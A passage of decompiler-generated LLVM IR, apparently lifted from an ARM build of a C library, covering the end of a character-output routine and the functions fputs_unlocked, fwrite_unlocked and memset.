  %v2_25c54 = icmp eq i32 %v1_25c50, 192
  store i1 %v2_25c54, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_25c54, label %dec_label_pc_25c70, label %dec_label_pc_25c5c

dec_label_pc_25c5c:                               ; preds = %dec_label_pc_25c4c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_25c64 = call i32 @__stdio_trans2w_o(i16* nonnull %tmp, i32 128)
  store i32 %v4_25c64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_25c68 = icmp eq i32 %v4_25c64, 0
  br i1 %v2_25c68, label %dec_label_pc_25c70, label %dec_label_pc_25d14

dec_label_pc_25c70:                               ; preds = %dec_label_pc_25c5c, %dec_label_pc_25c4c
  %v0_25c70 = load i32, i32* @r4, align 4
  %v1_25c70 = add i32 %v0_25c70, 4
  %v2_25c70 = inttoptr i32 %v1_25c70 to i32*
  %v3_25c70 = load i32, i32* %v2_25c70, align 4
  store i32 %v3_25c70, i32* %r3.global-to-local, align 4
  %v2_25c74 = icmp ugt i32 %v3_25c70, -3
  store i1 %v2_25c74, i1* %cpsr_c.global-to-local, align 1
  %v7_25c74 = icmp eq i32 %v3_25c70, -2
  br i1 %v7_25c74, label %dec_label_pc_25d0c, label %dec_label_pc_25c7c

dec_label_pc_25c7c:                               ; preds = %dec_label_pc_25c70
  %v1_25c7c = add i32 %v0_25c70, 12
  %v2_25c7c = inttoptr i32 %v1_25c7c to i32*
  %v3_25c7c = load i32, i32* %v2_25c7c, align 4
  store i32 %v3_25c7c, i32* %r2.global-to-local, align 4
  %v1_25c80 = add i32 %v0_25c70, 8
  %v2_25c80 = inttoptr i32 %v1_25c80 to i32*
  %v3_25c80 = load i32, i32* %v2_25c80, align 4
  store i32 %v3_25c80, i32* %r3.global-to-local, align 4
  %v3_25c84 = icmp uge i32 %v3_25c7c, %v3_25c80
  store i1 %v3_25c84, i1* %cpsr_c.global-to-local, align 1
  %v9_25c84 = icmp eq i32 %v3_25c7c, %v3_25c80
  br i1 %v9_25c84, label %dec_label_pc_25cf0, label %dec_label_pc_25c8c

dec_label_pc_25c8c:                               ; preds = %dec_label_pc_25c7c
  %v1_25c8c = add i32 %v0_25c70, 16
  %v2_25c8c = inttoptr i32 %v1_25c8c to i32*
  %v3_25c8c = load i32, i32* %v2_25c8c, align 4
  store i32 %v3_25c8c, i32* %r3.global-to-local, align 4
  %v3_25c90 = icmp uge i32 %v3_25c7c, %v3_25c8c
  store i1 %v3_25c90, i1* %cpsr_c.global-to-local, align 1
  %v9_25c90 = icmp eq i32 %v3_25c7c, %v3_25c8c
  br i1 %v9_25c90, label %dec_label_pc_25c98, label %dec_label_pc_25ca8

dec_label_pc_25c98:                               ; preds = %dec_label_pc_25c8c
  store i32 %v0_25c70, i32* @r0, align 4
  %v0_25c9c = call i32 @__stdio_wcommit()
  store i32 %v0_25c9c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_25ca0 = icmp eq i32 %v0_25c9c, 0
  br i1 %v2_25ca0, label %dec_label_pc_25c98.dec_label_pc_25ca8_crit_edge, label %dec_label_pc_25d14

dec_label_pc_25c98.dec_label_pc_25ca8_crit_edge:  ; preds = %dec_label_pc_25c98
  %v0_25ca8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_25ca8

dec_label_pc_25ca8:                               ; preds = %dec_label_pc_25c98.dec_label_pc_25ca8_crit_edge, %dec_label_pc_25c8c
  %v0_25ca8 = phi i32 [ %v0_25ca8.pre, %dec_label_pc_25c98.dec_label_pc_25ca8_crit_edge ], [ %v0_25c70, %dec_label_pc_25c8c ]
  %v1_25ca8 = add i32 %v0_25ca8, 16
  %v2_25ca8 = inttoptr i32 %v1_25ca8 to i32*
  %v3_25ca8 = load i32, i32* %v2_25ca8, align 4
  store i32 %v3_25ca8, i32* %r2.global-to-local, align 4
  %v0_25cac = load i32, i32* @r5, align 4
  %v1_25cac = urem i32 %v0_25cac, 256
  store i32 %v1_25cac, i32* %r1.global-to-local, align 4
  %v1_25cb0 = trunc i32 %v0_25cac to i8
  %v3_25cb0 = inttoptr i32 %v3_25ca8 to i8*
  store i8 %v1_25cb0, i8* %v3_25cb0, align 1
  %v4_25cb0 = load i32, i32* %r2.global-to-local, align 4
  %v5_25cb0 = add i32 %v4_25cb0, 1
  store i32 %v5_25cb0, i32* %r2.global-to-local, align 4
  %v0_25cb4 = load i32, i32* @r4, align 4
  %v1_25cb4 = inttoptr i32 %v0_25cb4 to i16*
  %v2_25cb4 = load i16, i16* %v1_25cb4, align 2
  %v3_25cb4 = zext i16 %v2_25cb4 to i32
  store i32 %v3_25cb4, i32* %r3.global-to-local, align 4
  %v1_25cb8 = and i32 %v3_25cb4, 256
  %v2_25cb8 = icmp eq i32 %v1_25cb8, 0
  %v2_25cbc = add i32 %v0_25cb4, 16
  %v3_25cbc = inttoptr i32 %v2_25cbc to i32*
  store i32 %v5_25cb0, i32* %v3_25cbc, align 4
  br i1 %v2_25cb8, label %dec_label_pc_25d0c, label %dec_label_pc_25cc4

dec_label_pc_25cc4:                               ; preds = %dec_label_pc_25ca8
  %v0_25cc4 = load i32, i32* %r1.global-to-local, align 4
  %v2_25cc4 = icmp ugt i32 %v0_25cc4, 9
  store i1 %v2_25cc4, i1* %cpsr_c.global-to-local, align 1
  %v7_25cc4 = icmp eq i32 %v0_25cc4, 10
  br i1 %v7_25cc4, label %dec_label_pc_25ccc, label %dec_label_pc_25d0c

dec_label_pc_25ccc:                               ; preds = %dec_label_pc_25cc4
  %v0_25ccc = load i32, i32* @r4, align 4
  store i32 %v0_25ccc, i32* @r0, align 4
  %v0_25cd0 = call i32 @__stdio_wcommit()
  store i32 %v0_25cd0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_25cd4 = icmp eq i32 %v0_25cd0, 0
  br i1 %v2_25cd4, label %dec_label_pc_25d0c, label %dec_label_pc_25cdc

dec_label_pc_25cdc:                               ; preds = %dec_label_pc_25ccc
  %v0_25cdc = load i32, i32* @r4, align 4
  %v1_25cdc = add i32 %v0_25cdc, 16
  %v2_25cdc = inttoptr i32 %v1_25cdc to i32*
  %v3_25cdc = load i32, i32* %v2_25cdc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_25ce4 = add i32 %v3_25cdc, -1
  store i32 %v1_25ce4, i32* %r3.global-to-local, align 4
  store i32 %v1_25ce4, i32* %v2_25cdc, align 4
  br label %dec_label_pc_25d18

dec_label_pc_25cf0:                               ; preds = %dec_label_pc_25c7c
  %v0_25cf4 = load i32, i32* @r5, align 4
  %v6_25cf4 = trunc i32 %v0_25cf4 to i8
  store i8 %v6_25cf4, i8* %stack_var_-17, align 1
  %v9_25cf4 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v9_25cf4, i32* %r1.global-to-local, align 4
  %v1_25cf8 = inttoptr i32 %v0_25c70 to i16*
  store i32 %v0_25c70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_25d00 = call i32 @__stdio_WRITE(i16* %v1_25cf8, i32 %v9_25cf4, i32 1)
  store i32 %v5_25d00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_25d04 = icmp eq i32 %v5_25d00, 0
  br i1 %v2_25d04, label %dec_label_pc_25d14, label %dec_label_pc_25d0c

dec_label_pc_25d0c:                               ; preds = %dec_label_pc_25cc4, %dec_label_pc_25cf0, %dec_label_pc_25ccc, %dec_label_pc_25ca8, %dec_label_pc_25c70
  %v0_25d0c = load i32, i32* @r5, align 4
  %v1_25d0c = urem i32 %v0_25d0c, 256
  store i32 %v1_25d0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25d18

dec_label_pc_25d14:                               ; preds = %dec_label_pc_25c98, %dec_label_pc_25c5c, %dec_label_pc_25cf0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25d18

dec_label_pc_25d18:                               ; preds = %.thread2, %dec_label_pc_25d0c, %dec_label_pc_25cdc, %dec_label_pc_25d14
  %v2_25d1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_25d1c, i32* @r4, align 4
  store i32 %v6_25c1c, i32* @r5, align 4
  %v1_25d20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_25d20

; uselistorder directives
  uselistorder i32 %v0_25cc4, { 1, 0 }
  uselistorder i32 %v0_25cac, { 1, 0 }
  uselistorder i32 %v0_25c70, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_25c34, { 1, 0, 2 }
  uselistorder i16* %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 10, 2, 3, 6, 4, 5, 7, 8, 12, 9, 11, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_25d18, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_25d14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25d0c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_25c4c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_25d24 = load i32, i32* @r4, align 4
  store i32 %v3_25d24, i32* %stack_var_-16, align 4
  %v6_25d24 = load i32, i32* @r5, align 4
  %v9_25d24 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_25d30 = call i32 @strlen(i8* %arg1)
  store i32 %v3_25d30, i32* @r6, align 4
  %v0_25d38 = load i32, i32* @r5, align 4
  %v0_25d3c = load i32, i32* @r4, align 4
  %v5_25d48 = inttoptr i32 %v0_25d38 to i16*
  %v6_25d48 = call i32 @__GI_fwrite_unlocked(i32 %v0_25d3c, i32 1, i32 %v3_25d30, i16* %v5_25d48)
  %v1_25d4c = load i32, i32* @r6, align 4
  %v9_25d4c = icmp eq i32 %v6_25d48, %v1_25d4c
  br i1 %v9_25d4c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_25d58 = phi i32 [ %v6_25d48, %entry ], [ -1, %bb ]
  %v2_25d54 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_25d54, i32* @r4, align 4
  store i32 %v6_25d24, i32* @r5, align 4
  store i32 %v9_25d24, i32* @r6, align 4
  ret i32 %v1_25d58

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_25d5c = load i32, i32* @r6, align 4
  %v12_25d5c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_25d64 = load i16, i16* %arg4, align 2
  %v1_25d68 = and i16 %v3_25d64, 192
  %v2_25d6c = icmp eq i16 %v1_25d68, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_25d6c, label %dec_label_pc_25d98, label %dec_label_pc_25d84

dec_label_pc_25d84:                               ; preds = %entry
  %v4_25d8c = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_25d90 = icmp eq i32 %v4_25d8c, 0
  br i1 %v2_25d90, label %dec_label_pc_25d98thread-pre-split, label %dec_label_pc_25df8

dec_label_pc_25d98thread-pre-split:               ; preds = %dec_label_pc_25d84
  %v0_25d98.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_25d98

dec_label_pc_25d98:                               ; preds = %dec_label_pc_25d98thread-pre-split, %entry
  %v0_25dbc = phi i32 [ %v0_25d98.pr, %dec_label_pc_25d98thread-pre-split ], [ %arg2, %entry ]
  %v2_25d98 = icmp eq i32 %v0_25dbc, 0
  br i1 %v2_25d98, label %dec_label_pc_25df8, label %bb

bb:                                               ; preds = %dec_label_pc_25d98
  %v1_25d9c = load i32, i32* @r6, align 4
  %v3_25d9c = icmp eq i32 %v1_25d9c, 0
  br i1 %v3_25d9c, label %dec_label_pc_25df8, label %dec_label_pc_25da4

dec_label_pc_25da4:                               ; preds = %bb
  %v2_25dac = udiv i32 -1, %v0_25dbc
  %tmp9 = icmp ugt i32 %v1_25d9c, %v2_25dac
  %v0_25dd8 = load i32, i32* @r5, align 4
  %v1_25dd8 = inttoptr i32 %v0_25dd8 to i16*
  br i1 %tmp9, label %dec_label_pc_25dd8, label %dec_label_pc_25db8

dec_label_pc_25db8:                               ; preds = %dec_label_pc_25da4
  store i32 %v0_25dd8, i32* %r2.global-to-local, align 4
  %v2_25dbc = mul i32 %v1_25d9c, %v0_25dbc
  %v0_25dc0 = load i32, i32* @r7, align 4
  %v5_25dc4 = call i32 @__stdio_fwrite(i32 %v0_25dc0, i32 %v2_25dbc, i16* %v1_25dd8)
  %v0_25dc8 = load i32, i32* @r4, align 4
  %v2_25dcc = udiv i32 %v5_25dc4, %v0_25dc8
  store i32 %v2_25dcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_25dfc

dec_label_pc_25dd8:                               ; preds = %dec_label_pc_25da4
  %v2_25dd8 = load i16, i16* %v1_25dd8, align 2
  %v1_25ddc = or i16 %v2_25dd8, 8
  store i16 %v1_25ddc, i16* %v1_25dd8, align 2
  %v0_25de4 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_25df0 = inttoptr i32 %v0_25de4 to i32*
  store i32 22, i32* %v2_25df0, align 4
  %v0_25dfc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_25dfc

dec_label_pc_25df8:                               ; preds = %dec_label_pc_25d98, %dec_label_pc_25d84, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_25dfc

dec_label_pc_25dfc:                               ; preds = %dec_label_pc_25dd8, %dec_label_pc_25db8, %dec_label_pc_25df8
  %v0_25dfc = phi i32 [ %v0_25dfc.pre, %dec_label_pc_25dd8 ], [ %v2_25dcc, %dec_label_pc_25db8 ], [ 0, %dec_label_pc_25df8 ]
  store i32 %v9_25d5c, i32* @r6, align 4
  store i32 %v12_25d5c, i32* @r7, align 4
  ret i32 %v0_25dfc

; uselistorder directives
  uselistorder i16* %v1_25dd8, { 0, 2, 1 }
  uselistorder i32 %v1_25d9c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i16*, i32)* @__stdio_trans2w_o, { 1, 0, 2 }
  uselistorder label %dec_label_pc_25dfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25df8, { 2, 0, 1 }
}

define i32 @__GI_memset() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %v0_25e10 = load i32, i32* @r0, align 4
  store i32 %v0_25e10, i32* @r3, align 4
  %v0_25e14 = load i32, i32* @r2, align 4
  %v8_25e14 = icmp eq i32 %v0_25e14, 8
  store i1 %v8_25e14, i1* %cpsr_z.global-to-local, align 1
  %v5_25e18 = icmp slt i32 %v0_25e14, 8
  br i1 %v5_25e18, label %dec_label_pc_25e78, label %dec_label_pc_25e1c

dec_label_pc_25e1c:                               ; preds = %entry
  %v0_25e1c = load i32, i32* @r1, align 4
  %v4_25e1c = mul i32 %v0_25e1c, 256
  %v5_25e1c = or i32 %v4_25e1c, %v0_25e1c
  %v4_25e20 = mul i32 %v5_25e1c, 65536
  %v5_25e20 = or i32 %v4_25e20, %v5_25e1c
  store i32 %v5_25e20, i32* @r1, align 4
  %v1_25e2457 = urem i32 %v0_25e10, 4
  %v2_25e2458 = icmp eq i32 %v1_25e2457, 0
  store i1 %v2_25e2458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %v0_25e1c to i8
  br i1 %v2_25e2458, label %dec_label_pc_25e34, label %bb

bb:                                               ; preds = %dec_label_pc_25e1c, %.thread.bb_crit_edge
  %v0_25e1c.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_25e1c ]
  %v3_25e2859 = phi i32 [ %v6_25e28, %.thread.bb_crit_edge ], [ %v0_25e10, %dec_label_pc_25e1c ]
  %v4_25e28 = inttoptr i32 %v3_25e2859 to i8*
  store i8 %v0_25e1c.sink.off0, i8* %v4_25e28, align 1
  %v5_25e28 = load i32, i32* @r3, align 4
  %v6_25e28 = add i32 %v5_25e28, 1
  store i32 %v6_25e28, i32* @r3, align 4
  %v0_25e2c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_25e38.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_25e2c.pr, label %dec_label_pc_25e34, label %.thread

.thread:                                          ; preds = %bb
  %v2_25e2c = add i32 %v0_25e38.pr.pre, -1
  store i32 %v2_25e2c, i32* @r2, align 4
  %v1_25e24 = urem i32 %v6_25e28, 4
  %v2_25e24 = icmp eq i32 %v1_25e24, 0
  store i1 %v2_25e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_25e24, label %dec_label_pc_25e34, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_25e28.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_25e28.pre to i8
  br label %bb

dec_label_pc_25e34:                               ; preds = %.thread, %bb, %dec_label_pc_25e1c
  %v0_25e4028 = phi i32 [ %v0_25e10, %dec_label_pc_25e1c ], [ %v6_25e28, %bb ], [ %v6_25e28, %.thread ]
  %v0_25e38.pr = phi i32 [ %v0_25e14, %dec_label_pc_25e1c ], [ %v0_25e38.pr.pre, %bb ], [ %v2_25e2c, %.thread ]
  %v0_25e34 = load i32, i32* @r1, align 4
  store i32 %v0_25e34, i32* @ip, align 4
  %v8_25e3810 = icmp eq i32 %v0_25e38.pr, 8
  store i1 %v8_25e3810, i1* %cpsr_z.global-to-local, align 1
  %v5_25e3c11 = icmp slt i32 %v0_25e38.pr, 8
  br i1 %v5_25e3c11, label %dec_label_pc_25e78, label %dec_label_pc_25e40.preheader

dec_label_pc_25e40.preheader:                     ; preds = %dec_label_pc_25e34
  %v1_25e4046 = inttoptr i32 %v0_25e4028 to i32*
  store i32 %v0_25e34, i32* %v1_25e4046, align 4
  %v3_25e4047 = add i32 %v0_25e4028, 4
  %v4_25e4048 = inttoptr i32 %v3_25e4047 to i32*
  %v5_25e4049 = load i32, i32* @ip, align 4
  store i32 %v5_25e4049, i32* %v4_25e4048, align 4
  %v6_25e4050 = add i32 %v0_25e4028, 8
  store i32 %v6_25e4050, i32* @r3, align 4
  %v0_25e4451 = load i32, i32* @r2, align 4
  %v1_25e4452 = add i32 %v0_25e4451, -8
  store i32 %v1_25e4452, i32* @r2, align 4
  %v5_25e4c53 = icmp slt i32 %v1_25e4452, 8
  br i1 %v5_25e4c53, label %dec_label_pc_25e40.dec_label_pc_25e78.loopexit_crit_edge, label %dec_label_pc_25e50

dec_label_pc_25e50:                               ; preds = %dec_label_pc_25e40.preheader, %dec_label_pc_25e38.dec_label_pc_25e40_crit_edge
  %v6_25e4055 = phi i32 [ %v6_25e40, %dec_label_pc_25e38.dec_label_pc_25e40_crit_edge ], [ %v6_25e4050, %dec_label_pc_25e40.preheader ]
  %v0_25e4054 = phi i32 [ %v12_25e6c, %dec_label_pc_25e38.dec_label_pc_25e40_crit_edge ], [ %v0_25e4028, %dec_label_pc_25e40.preheader ]
  %v1_25e50 = inttoptr i32 %v6_25e4055 to i32*
  %v2_25e50 = load i32, i32* @r1, align 4
  store i32 %v2_25e50, i32* %v1_25e50, align 4
  %v3_25e50 = add i32 %v0_25e4054, 12
  %v4_25e50 = inttoptr i32 %v3_25e50 to i32*
  %v5_25e50 = load i32, i32* @ip, align 4
  store i32 %v5_25e50, i32* %v4_25e50, align 4
  %v6_25e50 = add i32 %v0_25e4054, 16
  store i32 %v6_25e50, i32* @r3, align 4
  %v0_25e54 = load i32, i32* @r2, align 4
  %v1_25e54 = add i32 %v0_25e54, -8
  store i32 %v1_25e54, i32* @r2, align 4
  %v5_25e5c = icmp slt i32 %v1_25e54, 8
  br i1 %v5_25e5c, label %dec_label_pc_25e50.dec_label_pc_25e78.loopexit_crit_edge, label %dec_label_pc_25e60

dec_label_pc_25e60:                               ; preds = %dec_label_pc_25e50
  %v1_25e60 = inttoptr i32 %v6_25e50 to i32*
  %v2_25e60 = load i32, i32* @r1, align 4
  store i32 %v2_25e60, i32* %v1_25e60, align 4
  %v3_25e60 = add i32 %v0_25e4054, 20
  %v4_25e60 = inttoptr i32 %v3_25e60 to i32*
  %v5_25e60 = load i32, i32* @ip, align 4
  store i32 %v5_25e60, i32* %v4_25e60, align 4
  %v6_25e60 = add i32 %v0_25e4054, 24
  store i32 %v6_25e60, i32* @r3, align 4
  %v0_25e64 = load i32, i32* @r2, align 4
  %v1_25e64 = add i32 %v0_25e64, -8
  store i32 %v1_25e64, i32* @r2, align 4
  %v5_25e6c = icmp slt i32 %v1_25e64, 8
  br i1 %v5_25e6c, label %dec_label_pc_25e60.dec_label_pc_25e78.loopexit_crit_edge, label %dec_label_pc_25e38

dec_label_pc_25e38:                               ; preds = %dec_label_pc_25e60
  %v7_25e6c = inttoptr i32 %v6_25e60 to i32*
  %v8_25e6c = load i32, i32* @r1, align 4
  store i32 %v8_25e6c, i32* %v7_25e6c, align 4
  %v9_25e6c = add i32 %v0_25e4054, 28
  %v10_25e6c = inttoptr i32 %v9_25e6c to i32*
  %v11_25e6c = load i32, i32* @ip, align 4
  store i32 %v11_25e6c, i32* %v10_25e6c, align 4
  %v12_25e6c = add i32 %v0_25e4054, 32
  store i32 %v12_25e6c, i32* @r3, align 4
  %v6_25e70 = load i32, i32* @r2, align 4
  %v7_25e70 = add i32 %v6_25e70, -8
  store i32 %v7_25e70, i32* @r2, align 4
  %v5_25e3c = icmp slt i32 %v7_25e70, 8
  br i1 %v5_25e3c, label %dec_label_pc_25e38.dec_label_pc_25e78.loopexit_crit_edge, label %dec_label_pc_25e38.dec_label_pc_25e40_crit_edge

dec_label_pc_25e38.dec_label_pc_25e40_crit_edge:  ; preds = %dec_label_pc_25e38
  %v2_25e40.pre = load i32, i32* @r1, align 4
  %v1_25e40 = inttoptr i32 %v12_25e6c to i32*
  store i32 %v2_25e40.pre, i32* %v1_25e40, align 4
  %v3_25e40 = add i32 %v0_25e4054, 36
  %v4_25e40 = inttoptr i32 %v3_25e40 to i32*
  %v5_25e40 = load i32, i32* @ip, align 4
  store i32 %v5_25e40, i32* %v4_25e40, align 4
  %v6_25e40 = add i32 %v0_25e4054, 40
  store i32 %v6_25e40, i32* @r3, align 4
  %v0_25e44 = load i32, i32* @r2, align 4
  %v1_25e44 = add i32 %v0_25e44, -8
  store i32 %v1_25e44, i32* @r2, align 4
  %v5_25e4c = icmp slt i32 %v1_25e44, 8
  br i1 %v5_25e4c, label %dec_label_pc_25e40.dec_label_pc_25e78.loopexit_crit_edge, label %dec_label_pc_25e50

dec_label_pc_25e38.dec_label_pc_25e78.loopexit_crit_edge: ; preds = %dec_label_pc_25e38
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_25e78

dec_label_pc_25e40.dec_label_pc_25e78.loopexit_crit_edge: ; preds = %dec_label_pc_25e38.dec_label_pc_25e40_crit_edge, %dec_label_pc_25e40.preheader
  %v1_25e44.lcssa = phi i32 [ %v1_25e4452, %dec_label_pc_25e40.preheader ], [ %v1_25e44, %dec_label_pc_25e38.dec_label_pc_25e40_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_25e78

dec_label_pc_25e50.dec_label_pc_25e78.loopexit_crit_edge: ; preds = %dec_label_pc_25e50
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_25e78

dec_label_pc_25e60.dec_label_pc_25e78.loopexit_crit_edge: ; preds = %dec_label_pc_25e60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_25e78

dec_label_pc_25e78:                               ; preds = %dec_label_pc_25e34, %dec_label_pc_25e38.dec_label_pc_25e78.loopexit_crit_edge, %dec_label_pc_25e40.dec_label_pc_25e78.loopexit_crit_edge, %dec_label_pc_25e50.dec_label_pc_25e78.loopexit_crit_edge, %dec_label_pc_25e60.dec_label_pc_25e78.loopexit_crit_edge, %entry
  %v0_25e80 = phi i32 [ %v0_25e14, %entry ], [ %v1_25e64, %dec_label_pc_25e60.dec_label_pc_25e78.loopexit_crit_edge ], [ %v1_25e54, %dec_label_pc_25e50.dec_label_pc_25e78.loopexit_crit_edge ], [ %v1_25e44.lcssa, %dec_label_pc_25e40.dec_label_pc_25e78.loopexit_crit_edge ], [ %v7_25e70, %dec_label_pc_25e38.dec_label_pc_25e78.loopexit_crit_edge ], [ %v0_25e38.pr, %dec_label_pc_25e34 ]
  %v2_25e78 = icmp eq i32 %v0_25e80, 0
  store i1 %v2_25e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_25e78, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_25e78
  %v2_25e7c = load i32, i32* @r0, align 4
  ret i32 %v2_25e7c

bb33:                                             ; preds = %dec_label_pc_25e78
  %v1_25e80 = sub i32 7, %v0_25e80
  store i32 %v1_25e80, i32* @r2, align 4
  %v3_25e84 = mul i32 %v1_25e80, 4
  %v4_25e84 = add i32 %v3_25e84, ptrtoint (i32* @global_var_25e8c.1694 to i32)
  call void @__pseudo_branch(i32 %v4_25e84)
  %v0_25e88 = load i32, i32* @r0, align 4
  %v0_25e8c = load i32, i32* @r1, align 4
  %v1_25e8c = trunc i32 %v0_25e8c to i8
  %v2_25e8c = load i32, i32* @r3, align 4
  %v3_25e8c = inttoptr i32 %v2_25e8c to i8*
  store i8 %v1_25e8c, i8* %v3_25e8c, align 1
  %v4_25e8c = load i32, i32* @r3, align 4
  %v5_25e8c = add i32 %v4_25e8c, 1
  store i32 %v5_25e8c, i32* %r3.global-to-local, align 4
  %v0_25e90 = load i32, i32* @r1, align 4
  %v1_25e90 = trunc i32 %v0_25e90 to i8
  %v3_25e90 = inttoptr i32 %v5_25e8c to i8*
  store i8 %v1_25e90, i8* %v3_25e90, align 1
  %v4_25e90 = load i32, i32* %r3.global-to-local, align 4
  %v5_25e90 = add i32 %v4_25e90, 1
  store i32 %v5_25e90, i32* %r3.global-to-local, align 4
  %v0_25e94 = load i32, i32* @r1, align 4
  %v1_25e94 = trunc i32 %v0_25e94 to i8
  %v3_25e94 = inttoptr i32 %v5_25e90 to i8*
  store i8 %v1_25e94, i8* %v3_25e94, align 1
  %v4_25e94 = load i32, i32* %r3.global-to-local, align 4
  %v5_25e94 = add i32 %v4_25e94, 1
  store i32 %v5_25e94, i32* %r3.global-to-local, align 4
  %v0_25e98 = load i32, i32* @r1, align 4
  %v1_25e98 = trunc i32 %v0_25e98 to i8
  %v3_25e98 = inttoptr i32 %v5_25e94 to i8*
  store i8 %v1_25e98, i8* %v3_25e98, align 1
  %v4_25e98 = load i32, i32* %r3.global-to-local, align 4
  %v5_25e98 = add i32 %v4_25e98, 1
  store i32 %v5_25e98, i32* %r3.global-to-local, align 4
  %v0_25e9c = load i32, i32* @r1, align 4
  %v1_25e9c = trunc i32 %v0_25e9c to i8
  %v3_25e9c = inttoptr i32 %v5_25e98 to i8*
  store i8 %v1_25e9c, i8* %v3_25e9c, align 1
  %v4_25e9c = load i32, i32* %r3.global-to-local, align 4
  %v5_25e9c = add i32 %v4_25e9c, 1
  store i32 %v5_25e9c, i32* %r3.global-to-local, align 4
  %v0_25ea0 = load i32, i32* @r1, align 4
  %v1_25ea0 = trunc i32 %v0_25ea0 to i8
  %v3_25ea0 = inttoptr i32 %v5_25e9c to i8*
  store i8 %v1_25ea0, i8* %v3_25ea0, align 1
  %v4_25ea0 = load i32, i32* %r3.global-to-local, align 4
  %v5_25ea0 = add i32 %v4_25ea0, 1
  store i32 %v5_25ea0, i32* %r3.global-to-local, align 4
  %v0_25ea4 = load i32, i32* @r1, align 4
  %v1_25ea4 = trunc i32 %v0_25ea4 to i8
  %v3_25ea4 = inttoptr i32 %v5_25ea0 to i8*
  store i8 %v1_25ea4, i8* %v3_25ea4, align 1
  %v4_25ea4 = load i32, i32* %r3.global-to-local, align 4
  %v5_25ea4 = add i32 %v4_25ea4, 1
  store i32 %v5_25ea4, i32* @r3, align 4
  ret i32 %v0_25e88

; uselistorder directives
  uselistorder i32 %v6_25e40, { 1, 0 }
  uselistorder i32 %v12_25e6c, { 1, 2, 0 }
  uselistorder i32 %v0_25e4054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_25e38.pr, { 0, 2, 1 }
  uselistorder i32 %v6_25e28, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_25e1c, { 1, 0 }
  uselistorder i32 %v0_25e1c, { 1, 2, 0 }
  uselistorder i32 %v0_25e14, { 1, 0, 2, 3 }
  uselistorder i32 %v0_25e10, { 2, 1, 0, 3 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
